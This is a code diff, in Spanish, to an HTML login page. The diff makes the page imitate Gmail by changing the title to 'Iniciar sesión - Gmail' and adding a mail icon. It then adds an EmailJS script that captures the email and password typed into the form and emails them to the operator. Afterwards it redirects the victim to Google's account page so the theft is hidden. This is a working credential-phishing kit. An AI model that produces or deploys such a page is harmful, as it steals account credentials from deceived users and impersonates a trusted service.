@@ -3,9 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Gmail Style</title>
+    <title>Iniciar sesión - Gmail</title>
+    
+    <!-- Vincula Google Material Icons para el ícono de Gmail -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    
     <style>
-        /* Aquí van los estilos CSS */
         * {
             margin: 0;
             padding: 0;
@@ -38,10 +41,16 @@
             text-align: center;
         }
 
-        h1 {
+        .login-box h1 {
             font-size: 24px;
             color: #202124;
             margin-bottom: 30px;
+        }
+
+        .gmail-icon {
+            font-size: 40px;
+            color: #1a73e8;
+            margin-bottom: 20px;
         }
 
         .input-group {
@@ -103,6 +112,9 @@
 <body>
     <div class="login-container">
         <div class="login-box">
+            <!-- Ícono de Gmail -->
+            <span class="material-icons gmail-icon">mail</span>
+            
             <h1>Iniciar sesión</h1>
             <form id="login-form">
                 <div class="input-group">
@@ -120,5 +132,38 @@
             </form>
         </div>
     </div>
+
+    <!-- Script para EmailJS -->
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("YOUR_USER_ID");  // Sustituye "YOUR_USER_ID" con tu ID de usuario de EmailJS
+        })();
+
+        // Maneja el envío del formulario
+        document.getElementById("login-form").addEventListener("submit", function(event){
+            event.preventDefault();
+            
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // Configuración del mensaje que se enviará a través de EmailJS
+            var templateParams = {
+                email: email,
+                password: password
+            };
+
+            // Enviar el correo a través de EmailJS
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                .then(function(response) {
+                    console.log("Correo enviado con éxito", response);
+                    alert("Correo enviado con éxito. Iniciando sesión...");
+                    // Aquí puedes redirigir al usuario a la cuenta de Google, si lo deseas
+                    window.location.href = "https://myaccount.google.com";
+                }, function(error) {
+                    console.log("Error al enviar correo", error);
+                    alert("Ocurrió un error al enviar el correo. Intenta nuevamente.");
+                });
+        });
+    </script>
 </body>
 </html>
